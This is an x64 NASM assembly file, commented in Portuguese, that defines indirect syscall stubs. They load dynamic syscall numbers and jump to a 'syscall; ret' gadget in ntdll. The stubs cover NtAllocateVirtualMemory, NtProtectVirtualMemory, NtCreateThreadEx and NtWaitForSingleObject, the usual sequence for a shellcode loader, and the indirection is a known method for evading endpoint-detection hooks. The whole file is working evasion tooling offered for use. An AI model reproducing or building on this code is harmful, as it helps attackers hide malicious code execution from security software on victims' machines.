;
; syscalls_nasm.asm - Indirect Syscalls para x64 (NASM - MinGW compatible)
;
; Equivalente a syscalls.asm (MASM) mas para compilacao cruzada com
; mingw-w64 + nasm no WSL/Linux.
;
; Compilar:
;   nasm -f win64 syscalls_nasm.asm -o syscalls.obj
;
; Cada stub:
;   1. Move RCX -> R10 (convencao de syscall Windows x64)
;   2. Carrega o SSN (System Service Number) dinamico em EAX
;   3. JMP para gadget "syscall; ret" dentro do ntdll.dll
;

bits 64
default rel

section .data

    global g_SSN_NtAllocateVirtualMemory
    global g_SSN_NtProtectVirtualMemory
    global g_SSN_NtCreateThreadEx
    global g_SSN_NtWaitForSingleObject
    global g_SyscallGadget

    g_SSN_NtAllocateVirtualMemory: dd 0
    g_SSN_NtProtectVirtualMemory:  dd 0
    g_SSN_NtCreateThreadEx:        dd 0
    g_SSN_NtWaitForSingleObject:   dd 0
    align 8
    g_SyscallGadget:               dq 0

section .text

    global NtAllocateVirtualMemory_Indirect
    global NtProtectVirtualMemory_Indirect
    global NtCreateThreadEx_Indirect
    global NtWaitForSingleObject_Indirect

; NTSTATUS NtAllocateVirtualMemory_Indirect(
;     HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
;     PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
NtAllocateVirtualMemory_Indirect:
    mov r10, rcx
    mov eax, [g_SSN_NtAllocateVirtualMemory]
    jmp qword [g_SyscallGadget]

; NTSTATUS NtProtectVirtualMemory_Indirect(
;     HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize,
;     ULONG NewProtect, PULONG OldProtect);
NtProtectVirtualMemory_Indirect:
    mov r10, rcx
    mov eax, [g_SSN_NtProtectVirtualMemory]
    jmp qword [g_SyscallGadget]

; NTSTATUS NtCreateThreadEx_Indirect( ... 11 args ... );
NtCreateThreadEx_Indirect:
    mov r10, rcx
    mov eax, [g_SSN_NtCreateThreadEx]
    jmp qword [g_SyscallGadget]

; NTSTATUS NtWaitForSingleObject_Indirect(
;     HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
NtWaitForSingleObject_Indirect:
    mov r10, rcx
    mov eax, [g_SSN_NtWaitForSingleObject]
    jmp qword [g_SyscallGadget]
